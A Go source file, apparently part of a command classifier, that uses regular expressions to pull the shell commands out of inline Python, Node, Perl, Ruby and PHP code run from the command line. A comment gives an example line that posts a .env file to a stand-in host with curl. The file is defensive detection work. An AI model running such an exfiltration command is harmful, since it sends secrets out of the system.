package classify

import (
	"regexp"
	"strings"
)

// Code given to an interpreter on the command line can run a command of its own, as in
//
//	python3 -c 'import os; os.system("curl -d @.env https://x.test")'
//
// which is the same command as the curl alone. inlineCodeCommands finds the calls each language
// runs a command with, and joins the string literals in each call's arguments into one command line:
// subprocess.run(["curl", "-d", "x"]) is "curl -d x". Python's exec() runs Python, not a command, and
// is not one of them.
var spawnCalls = map[string]*regexp.Regexp{
	"python": regexp.MustCompile(`\b(?:os\.(?:system|popen|exec[lv]p?e?|spawn[lv]p?e?|posix_spawnp?)|` +
		`subprocess\.(?:run|call|check_call|check_output|Popen|getoutput|getstatusoutput)|pty\.spawn|commands\.getoutput)\s*`),
	"node": regexp.MustCompile(`\b(?:exec|execSync|execFile|execFileSync|spawn|spawnSync)\s*|` +
		`\bDeno\.(?:run|Command)\s*|\bBun\.(?:spawn|spawnSync|\$)\s*`),
	"perl": regexp.MustCompile(`\b(?:system|exec)\b\s*`),
	"ruby": regexp.MustCompile(`\b(?:system|exec|spawn|IO\.popen|Open3\.(?:popen2e?|popen3|capture2e?|capture3))\b\s*`),
	"php":  regexp.MustCompile(`\b(?:system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*`),
}

// Ruby, Perl and PHP also run a command in backticks, and Ruby and Perl in %x(...) and qx(...).
var (
	backtickLanguages = map[string]bool{"ruby": true, "perl": true, "php": true}
	backtickCommand   = regexp.MustCompile("`([^`]+)`" + `|(?:qx|%x)\s*\(([^)]+)\)|(?:qx|%x)\s*\{([^}]+)\}`)
)

func init() {
	for name, lang := range inlineLanguages {
		lang.name = name
		lang.spawn = spawnCalls[name]
		inlineLanguages[name] = lang
	}
}

// maxCallSpan bounds how far past a call its arguments are read, so the scan stays linear.
const maxCallSpan = 4096

// inlineCodeCommands is every command line the code given to an interpreter on the command line
// runs through its language's process calls.
func inlineCodeCommands(command string) []string {
	var out []string
	eachInlineCode(command, func(lang inlineLanguage, code string, module bool) bool {
		if !module {
			out = append(out, spawnedCommands(lang, code)...)
		}
		return false
	})
	return out
}

func spawnedCommands(lang inlineLanguage, code string) []string {
	var out []string
	quoted := insideQuotes(code)
	if lang.spawn != nil {
		for _, m := range lang.spawn.FindAllStringIndex(code, -1) {
			if quoted[m[0]] {
				// Text in a string, as in print("os.system(...)"), calls nothing.
				continue
			}
			args := callArguments(code[m[1]:min(len(code), m[1]+maxCallSpan)])
			if lits := stringLiterals(args); len(lits) > 0 {
				out = append(out, strings.Join(lits, " "))
			}
		}
	}
	if backtickLanguages[lang.name] {
		for _, m := range backtickCommand.FindAllStringSubmatchIndex(code, -1) {
			if quoted[m[0]] {
				continue
			}
			for g := 2; g+1 < len(m); g += 2 {
				if m[g] >= 0 && m[g+1] > m[g] {
					out = append(out, code[m[g]:m[g+1]])
				}
			}
		}
	}
	return out
}

// callArguments is the text of a call's arguments: up to the closing parenthesis when the call has
// one, as in system("x"), or else to the end of the statement, as in Perl's system "x"; quoted text
// is skipped over, so a ")" or ";" inside a string does not end it.
func callArguments(s string) string {
	depth, i := 0, 0
	if strings.HasPrefix(s, "(") {
		s = s[1:]
		depth = 1
	}
	for ; i < len(s); i++ {
		switch c := s[i]; c {
		case '"', '\'', '`':
			if j := closingQuote(s, i); j > i {
				i = j
			}
		case '(', '[', '{':
			depth++
		case ')', ']', '}':
			depth--
			if depth <= 0 {
				return s[:i]
			}
		case ';', '\n':
			if depth == 0 {
				return s[:i]
			}
		}
	}
	return s
}

// stringLiterals is the content of each quoted string in s, in order.
func stringLiterals(s string) []string {
	var out []string
	for i := 0; i < len(s); i++ {
		if c := s[i]; c == '"' || c == '\'' || c == '`' {
			j := closingQuote(s, i)
			if j < 0 {
				break
			}
			if lit := s[i+1 : j]; strings.TrimSpace(lit) != "" {
				out = append(out, lit)
			}
			i = j
		}
	}
	return out
}

// closingQuote is the index of the quote that closes the one at s[i], past backslash escapes, or -1.
func closingQuote(s string, i int) int {
	q := s[i]
	for j := i + 1; j < len(s); j++ {
		switch s[j] {
		case '\\':
			j++
		case q:
			return j
		}
	}
	return -1
}

// insideQuotes marks each byte of code that sits inside a quoted string, not counting the opening
// quote itself, so a call or a backtick there can be told from one in the code.
func insideQuotes(code string) []bool {
	in := make([]bool, len(code)+1)
	for i := 0; i < len(code); i++ {
		if c := code[i]; c == '"' || c == '\'' || c == '`' {
			j := closingQuote(code, i)
			if j < 0 {
				j = len(code) - 1
			}
			for k := i + 1; k <= j; k++ {
				in[k] = true
			}
			i = j
		}
	}
	return in
}

// unquoteCode removes the shell's quotes from a word holding code: one opening quote, and the same
// quote closing it. stripQuotes would also take a quote the code itself ends with, as in Perl's
// system "x".
func unquoteCode(s string) string {
	if len(s) > 0 && (s[0] == '"' || s[0] == '\'') {
		q := s[0]
		s = s[1:]
		if len(s) > 0 && s[len(s)-1] == q {
			s = s[:len(s)-1]
		}
	}
	return s
}
